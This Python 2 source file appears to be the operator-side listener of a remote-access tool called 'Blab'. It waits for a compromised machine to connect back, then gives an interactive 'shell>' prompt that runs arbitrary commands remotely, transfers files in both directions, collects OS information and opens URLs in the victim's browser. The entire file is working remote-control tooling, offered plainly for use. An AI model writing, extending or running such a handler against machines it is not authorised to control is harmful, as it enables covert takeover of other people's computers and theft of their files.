import socket, os
from sys import path
from colorama import Fore
from optparse import OptionParser

op = OptionParser ('--ip <IP Address for listening> -p <port for listening>')
op.add_option ('--ip', dest='ip', type='string')
op.add_option ('-p', '--port', dest='port', type='int')
(op, args) = op.parse_args ()

# Blab Modules

script = os.path.dirname(os.path.realpath(__file__))
path.insert (0, script + '/modules/')

import authors
from command_block import *

authors.print_authors () 
authors.print_prz_banner ()

first = False

print INFO + ' Waiting for connection...  (Press Crtl + C to exit)'

def main ():
    
    global first
    
    try:
    
        s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
        s.bind ((op.ip, op.port))
        s.listen(1)

        connection, address = s.accept ()
    
    
        while True:
        
            if not first:
                print INFO + ' ' + str (address[0]) + ' connected!'
                first = True
        
            cmd = raw_input('shell> ')
        
            if cmd == 'quit':
                connection.send (cmd)
                print INFO + ' Session closed!'
                s.close ()
                break
            elif cmd.split (' ')[0] == 'download':
                download_file (connection, cmd.split (' ')[1], cmd.split(' ')[1])
            elif cmd.split (' ')[0] == 'help':
                try:
                    get_help (cmd.split (' ')[1])
                except:
                    get_help ('null')
                connection.send ('revers')
            elif cmd.split (' ')[0] == 'upload':
                upload_file (connection, cmd.split (' ')[1], cmd.split (' ')[2])
            elif cmd == 'clear':
                clear ()
                connection.send ('revers')
            elif cmd.strip (' ') == '':
                connection.send ('revers')
            elif cmd == 'get_os':
                get_os_info (connection)
            elif cmd.split (' ')[0] == 'cd':
                chdir (connection, cmd.split (' ')[1])
                connection.send ('revers')
            elif cmd.split (' ')[0] == 'cd_local':
                chdir_local (connection, cmd.split (' ')[1])
            elif cmd.split (' ')[0] == 'open_browser':
                connection.send ('wopen:' + cmd.split (' ')[1])
            else:
                if cmd.split (' ')[0]!= 'local_cmd':
                    connection.send (cmd)
                else:
                    os.system (cmd.split (' ')[1])
                    connection.send ('revers')
        
            data = connection.recv (1024)
            if data and data.split (':')[0] != 'dl':
                print data
                
    except KeyboardInterrupt:
        print Fore.WHITE + '[*] Good Bye!' + Fore.RESET
        
            
if __name__ == '__main__':
    main ()
